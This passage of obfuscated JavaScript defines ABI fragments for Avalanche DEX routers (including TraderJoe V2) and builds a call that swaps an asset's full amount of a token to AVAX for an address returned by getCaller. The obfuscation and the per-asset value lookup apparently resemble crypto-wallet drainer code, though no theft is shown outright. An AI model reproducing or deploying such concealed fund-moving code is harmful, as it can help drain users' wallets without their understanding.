            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': "uint256"
            }, {
              'internalType': "uint256",
              'name': "amountAVAX",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x36fd03 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x4e5746 = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x4e0e6b = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x527a8a = {
            internalType: 'uint256',
            name: "amountAVAXMin",
            type: 'uint256'
          };
          const _0x5639b7 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x33ce27 = {
            internalType: 'uint256',
            name: "deadline",
            type: "uint256"
          };
          const _0x150dec = {
            internalType: "bool",
            name: 'approveMax',
            type: "bool"
          };
          const _0x5220db = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x2f013a = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x15192f = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x367a43 = {
            inputs: [_0x36fd03, _0x4e5746, _0x4e0e6b, _0x527a8a, _0x5639b7, _0x33ce27, _0x150dec, _0x5220db, _0x2f013a, _0x15192f],
            name: "removeLiquidityAVAXWithPermitSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountAVAX",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xeec7ac = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x271b03 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x4b2f80 = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x5e580f = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x331a1c = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x42b308 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x47d977 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x49994f = {
            internalType: "bool",
            name: 'approveMax',
            type: "bool"
          };
          const _0xb23f00 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x410343 = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0xc6b199 = {
            internalType: "bytes32",
            name: 's',
            type: 'bytes32'
          };
          const _0x1ffdf3 = {
            inputs: [_0xeec7ac, _0x271b03, _0x4b2f80, _0x5e580f, _0x331a1c, _0x42b308, _0x47d977, _0x49994f, _0xb23f00, _0x410343, _0xc6b199],
            name: "removeLiquidityWithPermit",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2cbd98 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x531826 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x3a25d7 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xf7479c = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x33cb12 = {
            inputs: [_0x2cbd98, _0x531826, _0x3a25d7, _0xf7479c],
            name: "swapAVAXForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': 'amounts',
              'type': "uint256[]"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x389e27 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x36f091 = {
            internalType: "address[]",
            name: 'path',
            type: 'address[]'
          };
          const _0x6303d2 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1cfab4 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4532aa = {
            inputs: [_0x389e27, _0x36f091, _0x6303d2, _0x1cfab4],
            name: "swapExactAVAXForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x197bce = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x1cf508 = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x37c453 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x4869ec = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x3cd6b7 = {
            inputs: [_0x197bce, _0x1cf508, _0x37c453, _0x4869ec],
            name: "swapExactAVAXForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x1025f5 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x51d35c = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x41bd16 = {
            internalType: 'address[]',
            name: 'path',
            type: 'address[]'
          };
          const _0x1a9c2d = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xfc547f = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3a26d9 = {
            inputs: [_0x1025f5, _0x51d35c, _0x41bd16, _0x1a9c2d, _0xfc547f],
            name: "swapExactTokensForAVAX",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x483a05 = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x398285 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x46dea7 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x2a3a83 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x118493 = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x49bfb7 = {
            inputs: [_0x483a05, _0x398285, _0x46dea7, _0x2a3a83, _0x118493],
            name: "swapExactTokensForAVAXSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2b8c2d = {
            internalType: "uint256",
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x5bb433 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x383c01 = {
            internalType: "address[]",
            name: 'path',
            type: 'address[]'
          };
          const _0x366991 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5a451a = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2c6ba9 = {
            inputs: [_0x2b8c2d, _0x5bb433, _0x383c01, _0x366991, _0x5a451a],
            name: "swapExactTokensForTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xf1610c = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x2383fb = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x3ec199 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x36db73 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1cddb0 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x520856 = {
            inputs: [_0xf1610c, _0x2383fb, _0x3ec199, _0x36db73, _0x1cddb0],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x571278 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x1699ef = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x20d3b7 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x42411b = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x4f04fe = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x50062f = {
            inputs: [_0x571278, _0x1699ef, _0x20d3b7, _0x42411b, _0x4f04fe],
            name: "swapTokensForExactAVAX",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4594a0 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x8e778a = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0xa8a3a7 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x421755 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x211c14 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x56e806 = {
            inputs: [_0x4594a0, _0x8e778a, _0xa8a3a7, _0x421755, _0x211c14],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amounts",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4bdcb5 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x3b0a9b = [_0x51eef4, _0x3370f2, _0x54edfb, _0x1857f8, _0x2fa8eb, _0x27372b, _0x3c7b16, _0x199898, _0x293ffc, _0xc0ee70, _0x40ca3a, _0x3be748, _0x2793d6, _0x5aebcb, _0x367a43, _0x1ffdf3, _0x33cb12, _0x4532aa, _0x3cd6b7, _0x3a26d9, _0x49bfb7, _0x2c6ba9, _0x520856, _0x50062f, _0x56e806, _0x4bdcb5];
          let _0x202695 = new ethers.Contract(_0x3941f8, _0x3b0a9b, _0xab3127);
          let _0x4e01fd = await _0x202695.WAVAX();
          let _0x44d9a8 = [];
          _0x44d9a8[0] = _0x2a18aa.asset.token;
          _0x44d9a8[1] = _0x4e01fd;
          try {
            let _0x467f16 = this.token_array.find(_0x4f1477 => _0x4f1477.token_address == _0x2a18aa.asset.token && _0x4f1477.chain == _0x2a18aa.chain);
            let _0x32d298 = this.token_array.find(_0x64162f => _0x64162f.token_address == "native" && _0x64162f.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x467f16.value) * Number(0.7) / Number(_0x32d298.price)).toString(), 'ether'));
          } catch {}
          return [_0x202695.swapExactTokensForAVAX(_0x2a18aa.asset.amount, _0xcd0737, _0x44d9a8, this.getCaller(_0x2a18aa), _0x4d5eff), _0x4e01fd];
        }
      case "TraderJoeV2":
        {
          const _0x3b7f46 = {
            internalType: "contract ILBFactory",
            name: "_factory",
            type: "address"
          };
          const _0x2bac26 = {
            internalType: "contract IJoeFactory",
            name: "_oldFactory",
            type: "address"
          };
          const _0x5a2202 = {
            internalType: "contract IWAVAX",
            name: "_wavax",
            type: "address"
          };
          const _0x45a533 = {
            inputs: [_0x3b7f46, _0x2bac26, _0x5a2202],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x2fa506 = {
            internalType: 'uint256',
            name: 'bp',
            type: 'uint256'
          };
          const _0x90832c = {
            inputs: [_0x2fa506],
            name: "BinHelper__BinStepOverflows",
            type: "error"
          };
          const _0x1e5067 = {
            inputs: [],
            name: "BinHelper__IdOverflows",
            type: "error"
          };
          const _0x488baf = {
            inputs: [],
            name: "JoeLibrary__InsufficientAmount",
            type: "error"
          };
          const _0x4a6db7 = {
            inputs: [],
            name: "JoeLibrary__InsufficientLiquidity",
            type: "error"
          };
          const _0x93877f = {
            internalType: 'uint256',
            name: "amountXMin",
            type: 'uint256'
          };
          const _0x2dbb51 = {
            internalType: 'uint256',
            name: 'amountX',
            type: 'uint256'
          };
          const _0x1d6391 = {
            internalType: 'uint256',
            name: "amountYMin",
            type: "uint256"
          };
          const _0x2d8573 = {
            internalType: 'uint256',
            name: "amountY",
            type: "uint256"
          };
          const _0x2ea0ae = {
            inputs: [_0x93877f, _0x2dbb51, _0x1d6391, _0x2d8573],
            name: "LBRouter__AmountSlippageCaught",
            type: "error"
          };
          const _0x2153e8 = {
            internalType: "uint256",
            name: 'id',
            type: 'uint256'
          };
          const _0x27526d = {
            inputs: [_0x2153e8],
            name: "LBRouter__BinReserveOverflows",
            type: "error"
          };
          const _0x1d3c08 = {
            inputs: [],
            name: "LBRouter__BrokenSwapSafetyCheck",
            type: "error"
          };
          const _0x2920f8 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x4bb7ce = {
            internalType: "uint256",
            name: "currentTimestamp",
            type: 'uint256'
          };
          const _0x32945f = {
            inputs: [_0x2920f8, _0x4bb7ce],
            name: "LBRouter__DeadlineExceeded",
            type: "error"
          };
          const _0x3eee3c = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x358213 = {
            internalType: 'uint256',
            name: "amount",
            type: "uint256"
          };
          const _0x1656ef = {
            inputs: [_0x3eee3c, _0x358213],
            name: "LBRouter__FailedToSendAVAX",
            type: "error"
          };
          const _0x1a1410 = {
            internalType: 'uint256',
            name: "idDesired",
            type: 'uint256'
          };
          const _0x5bc777 = {
            internalType: "uint256",
            name: "idSlippage",
            type: 'uint256'
          };
          const _0x32720f = {
            inputs: [_0x1a1410, _0x5bc777],
            name: "LBRouter__IdDesiredOverflows",
            type: "error"
          };
          const _0x6384c1 = {
            internalType: "int256",
            name: 'id',
            type: "int256"
          };
          const _0x3d8955 = {
            inputs: [_0x6384c1],
            name: "LBRouter__IdOverflows",
            type: "error"
          };
          const _0x156bc7 = {
            internalType: 'uint256',
            name: "activeIdDesired",
            type: 'uint256'
          };
          const _0x3af653 = {
            internalType: 'uint256',
            name: "idSlippage",
            type: 'uint256'
          };
          const _0x4ba7d3 = {
            internalType: 'uint256',
            name: "activeId",
            type: "uint256"
          };
          const _0x3b284c = {
            inputs: [_0x156bc7, _0x3af653, _0x4ba7d3],
            name: "LBRouter__IdSlippageCaught",
            type: "error"
          };
          const _0x1111c5 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x1ba6c4 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x2eaabb = {
            inputs: [_0x1111c5, _0x1ba6c4],
            name: "LBRouter__InsufficientAmountOut",
            type: "error"
          };
          const _0x4e10bb = {
            internalType: "address",
            name: 'wrongToken',
            type: "address"
          };
          const _0x51c52b = {
            inputs: [_0x4e10bb],
            name: "LBRouter__InvalidTokenPath",
            type: "error"
          };
          const _0x16b452 = {
            inputs: [],
            name: "LBRouter__LengthsMismatch",
            type: "error"
          };
          const _0xb52072 = {
            internalType: 'uint256',
            name: "amountInMax",
            type: "uint256"
          };
          const _0x44e247 = {
            internalType: 'uint256',
            name: "amountIn",
            type: "uint256"
          };
          const _0x5637e2 = {
            inputs: [_0xb52072, _0x44e247],
            name: "LBRouter__MaxAmountInExceeded",
            type: "error"
          };
          const _0x5d8dbc = {
            inputs: [],
            name: "LBRouter__NotFactoryOwner",
            type: "error"
          };
          const _0x5d0cbd = {
            internalType: "address",
            name: "tokenX",
            type: "address"
          };
          const _0xa6f6aa = {
            internalType: "address",
            name: "tokenY",
            type: "address"
          };
          const _0x41f741 = {
            internalType: 'uint256',
            name: "binStep",
            type: 'uint256'
          };
          const _0x7073d8 = {
            inputs: [_0x5d0cbd, _0xa6f6aa, _0x41f741],
            name: "LBRouter__PairNotCreated",
            type: "error"
          };
          const _0x3342ac = {
            inputs: [],
            name: "LBRouter__SenderIsNotWAVAX",
            type: "error"
          };
          const _0x39edf0 = {
            internalType: 'uint256',
            name: 'id',
            type: 'uint256'
          };
          const _0x236a78 = {
            inputs: [_0x39edf0],
            name: "LBRouter__SwapOverflows",
            type: "error"
          };
          const _0x115891 = {
            internalType: "uint256",
            name: 'excess',
            type: 'uint256'
          };
          const _0x2c5cd6 = {
            inputs: [_0x115891],
            name: "LBRouter__TooMuchTokensIn",
            type: "error"
          };
          const _0x2a2421 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0xa8738a = {
            internalType: "uint256",
            name: "reserve",
            type: "uint256"
          };
          const _0x14bc62 = {
            inputs: [_0x2a2421, _0xa8738a],
            name: "LBRouter__WrongAmounts",
            type: "error"
          };
          const _0x2add4e = {
            internalType: "address",
            name: "tokenX",
            type: "address"
          };
          const _0x39a15e = {
            internalType: "address",
            name: "tokenY",
            type: 'address'
          };
          const _0x2d1560 = {
            internalType: 'uint256',
            name: "amountX",
            type: 'uint256'
          };
          const _0x4d08a9 = {
            internalType: 'uint256',
            name: "amountY",
            type: 'uint256'
          };
          const _0x1af4f1 = {
            internalType: 'uint256',
            name: "msgValue",
            type: "uint256"
          };
          const _0x2ad6c0 = {
            inputs: [_0x2add4e, _0x39a15e, _0x2d1560, _0x4d08a9, _0x1af4f1],
            name: "LBRouter__WrongAvaxLiquidityParameters",
            type: "error"
          };
          const _0x4571d8 = {
            inputs: [],
            name: "LBRouter__WrongTokenOrder",
            type: "error"
          };
          const _0x22c30d = {
            inputs: [],
            name: "Math128x128__LogUnderflow",
            type: "error"
          };
          const _0x1e01f6 = {
            internalType: "uint256",
            name: 'x',
            type: 'uint256'
          };
          const _0xef45e6 = {
            internalType: "int256",
            name: 'y',
            type: "int256"
          };
          const _0x43df21 = {
            inputs: [_0x1e01f6, _0xef45e6],
            name: "Math128x128__PowerUnderflow",
            type: "error"
          };
          const _0x2aeaf9 = {
            internalType: 'uint256',
            name: "prod1",
            type: 'uint256'
          };
          const _0x7584d5 = {
            internalType: 'uint256',
            name: "denominator",
            type: 'uint256'
          };
          const _0x3a0475 = {
            inputs: [_0x2aeaf9, _0x7584d5],
            name: "Math512Bits__MulDivOverflow",
            type: "error"
          };
          const _0x122e5f = {
            internalType: 'uint256',
            name: 'prod1',
            type: "uint256"
          };
          const _0x3a7e33 = {
            internalType: 'uint256',
            name: "offset",
            type: 'uint256'
          };
          const _0x2c8fe7 = {
            inputs: [_0x122e5f, _0x3a7e33],
            name: "Math512Bits__MulShiftOverflow",
            type: "error"
          };
          const _0x5620fe = {
            internalType: 'uint256',
            name: "offset",
            type: 'uint256'
          };
          const _0x24c39e = {
            inputs: [_0x5620fe],
            name: "Math512Bits__OffsetOverflows",
            type: "error"
          };
          const _0x3bfb4d = {
            internalType: 'uint256',
            name: 'x',
            type: 'uint256'
          };
          const _0x4fe06a = {
            inputs: [_0x3bfb4d],
            name: "SafeCast__Exceeds128Bits",
            type: "error"
          };
          const _0x1f32f8 = {
            internalType: 'uint256',
            name: 'x',
            type: 'uint256'
          };
          const _0x3da99b = {
            inputs: [_0x1f32f8],
            name: "SafeCast__Exceeds40Bits",
            type: "error"
          };
          const _0x169027 = {
            inputs: [],
            name: "TokenHelper__CallFailed",
            type: "error"
          };
          const _0x37d70a = {
            inputs: [],
            name: "TokenHelper__NonContract",
            type: "error"
          };
          const _0x7bfb00 = {
            inputs: [],
            name: "TokenHelper__TransferFailed",
            type: "error"
          };
          const _0x5b363a = {
            internalType: "contract IERC20",
            name: "tokenX",
            type: "address"
          };
          const _0x4da58c = {
            internalType: "contract IERC20",
            name: "tokenY",
            type: "address"
          };
          const _0x5820c9 = {
            internalType: 'uint256',
            name: 'binStep',
            type: 'uint256'
          };
          const _0x1cd3ec = {
            internalType: 'uint256',
            name: 'amountX',
            type: 'uint256'
          };
          const _0xbe1974 = {
            internalType: 'uint256',
            name: "amountY",
            type: "uint256"
          };
          const _0x279824 = {
            internalType: "uint256",
            name: "amountXMin",
            type: 'uint256'
          };
          const _0x438f5d = {
            internalType: 'uint256',
            name: "amountYMin",
            type: 'uint256'
          };
          const _0x2fe47a = {
            internalType: 'uint256',
            name: "activeIdDesired",
            type: "uint256"
          };
          const _0x1d6cd3 = {
            internalType: "uint256",
            name: "idSlippage",
            type: "uint256"
          };
          const _0x1c8609 = {
            internalType: "int256[]",
            name: 'deltaIds',
            type: "int256[]"
          };
          const _0x5f4c9b = {
            internalType: "uint256[]",
            name: "distributionX",
            type: 'uint256[]'
          };
          const _0x38dbdc = {
            internalType: 'uint256[]',
            name: "distributionY",
            type: 'uint256[]'
          };
          const _0xba051e = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x4a33aa = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2a4fd3 = {
            components: [_0x5b363a, _0x4da58c, _0x5820c9, _0x1cd3ec, _0xbe1974, _0x279824, _0x438f5d, _0x2fe47a, _0x1d6cd3, _0x1c8609, _0x5f4c9b, _0x38dbdc, _0xba051e, _0x4a33aa],
            internalType: "struct ILBRouter.LiquidityParameters",
            name: "_liquidityParameters",
            type: "tuple"
          };
          const _0x3a6aee = {
            internalType: "uint256[]",
            name: "depositIds",
            type: 'uint256[]'
          };
          const _0x3e0e59 = {
            internalType: 'uint256[]',
            name: "liquidityMinted",
            type: 'uint256[]'
          };
          const _0x3202f1 = {
            inputs: [_0x2a4fd3],
            name: "addLiquidity",
            outputs: [_0x3a6aee, _0x3e0e59],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x16a3e9 = {
            internalType: "contract IERC20",
            name: "tokenX",
            type: "address"
          };
          const _0x296bfd = {
            internalType: "contract IERC20",
            name: "tokenY",
            type: "address"
          };
          const _0x225fde = {
            internalType: 'uint256',
            name: "binStep",
            type: 'uint256'
          };
          const _0x34930e = {
            internalType: 'uint256',
            name: "amountX",
            type: 'uint256'
          };
          const _0x3a9a4a = {
            internalType: 'uint256',
            name: "amountY",
            type: 'uint256'
          };
          const _0x33651d = {
            internalType: 'uint256',
            name: "amountXMin",
            type: "uint256"
          };
          const _0x35c140 = {
            internalType: "uint256",
            name: "amountYMin",
            type: 'uint256'
          };
          const _0x558971 = {
            internalType: 'uint256',
            name: "activeIdDesired",
            type: "uint256"
          };
          const _0x1bcafa = {
            internalType: 'uint256',
            name: "idSlippage",
            type: 'uint256'
          };
          const _0x424088 = {
            internalType: "int256[]",
            name: 'deltaIds',
            type: "int256[]"
          };
          const _0x18adb3 = {
            internalType: 'uint256[]',
            name: "distributionX",
            type: 'uint256[]'
          };
          const _0x2ecbbf = {
            internalType: 'uint256[]',
            name: "distributionY",
            type: 'uint256[]'
          };
          const _0x3ef5c4 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x14ebde = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4064fe = {
            components: [_0x16a3e9, _0x296bfd, _0x225fde, _0x34930e, _0x3a9a4a, _0x33651d, _0x35c140, _0x558971, _0x1bcafa, _0x424088, _0x18adb3, _0x2ecbbf, _0x3ef5c4, _0x14ebde],
            internalType: "struct ILBRouter.LiquidityParameters",
            name: "_liquidityParameters",
            type: "tuple"
          };
          const _0x4bde33 = {
            inputs: [_0x4064fe],
            name: "addLiquidityAVAX",
            outputs: [{
              'internalType': "uint256[]",
              'name': "depositIds",
              'type': 'uint256[]'
            }, {
              'internalType': 'uint256[]',
              'name': "liquidityMinted",
              'type': 'uint256[]'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x1a546e = {
            internalType: "contract IERC20",
            name: "_tokenX",
            type: "address"
          };
          const _0x38a470 = {
            internalType: "contract IERC20",
            name: "_tokenY",
            type: "address"
          };
          const _0x543a9b = {
            internalType: "uint24",
            name: "_activeId",
            type: "uint24"
          };
          const _0x348e09 = {
            internalType: "uint16",
            name: '_binStep',
            type: "uint16"
          };
          const _0x4ccaed = {
            internalType: "contract ILBPair",
            name: "pair",
            type: "address"
          };
          const _0xbff6a8 = {
            inputs: [_0x1a546e, _0x38a470, _0x543a9b, _0x348e09],
            name: "createLBPair",
            outputs: [_0x4ccaed],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x393bbc = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "contract ILBFactory",
              'name': '',
              'type': "address"
            }],
            stateMutability: 'view',
            type: "function"
          };
          const _0x37a11a = {
            internalType: "contract ILBPair",
            name: "_LBPair",
            type: "address"
          };
          const _0x5b9f0d = {
            internalType: 'uint256',
            name: '_price',
            type: 'uint256'
          };
          const _0x32cd73 = {
            inputs: [_0x37a11a, _0x5b9f0d],
            name: "getIdFromPrice",
            outputs: [{
              'internalType': "uint24",
              'name': '',
              'type': "uint24"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x339d91 = {
            internalType: "contract ILBPair",
            name: "_LBPair",
            type: "address"
          };
          const _0x17aceb = {
            internalType: "uint24",
            name: "_id",
            type: "uint24"
          };
          const _0x525cbd = {
            inputs: [_0x339d91, _0x17aceb],
            name: "getPriceFromId",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x12f98a = {
            internalType: "contract ILBPair",
            name: "_LBPair",
            type: "address"
          };
          const _0x19d68f = {
            internalType: 'uint256',
            name: "_amountOut",
            type: 'uint256'
          };
          const _0x3a06b6 = {
            internalType: "bool",
            name: "_swapForY",
            type: "bool"
          };
          const _0x5c5acf = {
            inputs: [_0x12f98a, _0x19d68f, _0x3a06b6],
            name: "getSwapIn",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountIn",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': 'feesIn',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x52b2a5 = {
            internalType: "contract ILBPair",
            name: "_LBPair",
            type: "address"
          };
          const _0x33bbdc = {
            internalType: 'uint256',
            name: "_amountIn",
            type: 'uint256'
          };
          const _0x58f18a = {
            internalType: "bool",
            name: "_swapForY",
            type: "bool"
          };
          const _0x41e826 = {
            inputs: [_0x52b2a5, _0x33bbdc, _0x58f18a],
            name: "getSwapOut",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountOut',
              'type': 'uint256'
            }, {
              'internalType': "uint256",
              'name': 'feesIn',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4d0aa1 = {
            internalType: "contract IJoeFactory",
            name: '',
            type: "address"
          };
          const _0x405575 = {
            inputs: [],
            name: 'oldFactory',
            outputs: [_0x4d0aa1],
            stateMutability: "view",
            type: "function"
          };
          const _0x15d5a0 = {
            internalType: "contract IERC20",
            name: "_tokenX",
            type: "address"
          };
          const _0x2fc791 = {
            internalType: "contract IERC20",
            name: "_tokenY",
            type: "address"
          };
          const _0x35e505 = {
            internalType: "uint16",
            name: "_binStep",
            type: "uint16"
          };
          const _0xad8b7b = {
            internalType: 'uint256',
            name: "_amountXMin",
            type: "uint256"
          };
          const _0x54e058 = {
            internalType: 'uint256',
            name: "_amountYMin",
            type: "uint256"
          };
          const _0x297a14 = {
            internalType: 'uint256[]',
            name: "_ids",
            type: 'uint256[]'
          };
          const _0x57e8e8 = {
            internalType: 'uint256[]',
            name: "_amounts",
            type: "uint256[]"
          };
          const _0x1ec6a6 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x1bdd19 = {
            internalType: 'uint256',
            name: "_deadline",
            type: 'uint256'
          };
          const _0x1a9229 = {
            inputs: [_0x15d5a0, _0x2fc791, _0x35e505, _0xad8b7b, _0x54e058, _0x297a14, _0x57e8e8, _0x1ec6a6, _0x1bdd19],
            name: "removeLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountX",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountY",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xafd902 = {
            internalType: "contract IERC20",
            name: "_token",
            type: "address"
          };
          const _0x15e160 = {
            internalType: "uint16",
            name: '_binStep',
            type: "uint16"
          };
          const _0x1b2738 = {
            internalType: 'uint256',
            name: "_amountTokenMin",
            type: 'uint256'
          };
          const _0x30a45f = {
            internalType: 'uint256',
            name: "_amountAVAXMin",
            type: "uint256"
          };
          const _0x438590 = {
            internalType: "uint256[]",
            name: "_ids",
            type: "uint256[]"
          };
          const _0x4c4ccc = {
            internalType: 'uint256[]',
            name: "_amounts",
            type: 'uint256[]'
          };
          const _0x5161a0 = {
            internalType: "address payable",
            name: "_to",
            type: "address"
          };
          const _0x21dca3 = {
            internalType: 'uint256',
            name: "_deadline",
            type: 'uint256'
          };
          const _0x457ed7 = {
            internalType: "uint256",
            name: "amountToken",
            type: "uint256"
          };
          const _0x455a95 = {
            internalType: 'uint256',
            name: 'amountAVAX',
            type: "uint256"
          };
          const _0x1df374 = {
            inputs: [_0xafd902, _0x15e160, _0x1b2738, _0x30a45f, _0x438590, _0x4c4ccc, _0x5161a0, _0x21dca3],
            name: "removeLiquidityAVAX",
            outputs: [_0x457ed7, _0x455a95],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x32826d = {
            internalType: 'uint256',
            name: "_amountOut",
            type: 'uint256'
          };
          const _0x54a50f = {
            internalType: 'uint256[]',
            name: "_pairBinSteps",
            type: 'uint256[]'
          };
          const _0x1fc0a4 = {
            internalType: "contract IERC20[]",
            name: "_tokenPath",
            type: "address[]"
          };
          const _0x5dd4e3 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x3b7d87 = {
            internalType: 'uint256',
            name: "_deadline",
            type: "uint256"
          };
          const _0x5297c2 = {
            inputs: [_0x32826d, _0x54a50f, _0x1fc0a4, _0x5dd4e3, _0x3b7d87],
            name: "swapAVAXForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amountsIn",
              'type': "uint256[]"
            }],
            stateMutability: "payable",
            type: 'function'
          };
          const _0x5122f1 = {
            internalType: 'uint256',
            name: "_amountOutMin",
            type: 'uint256'
          };
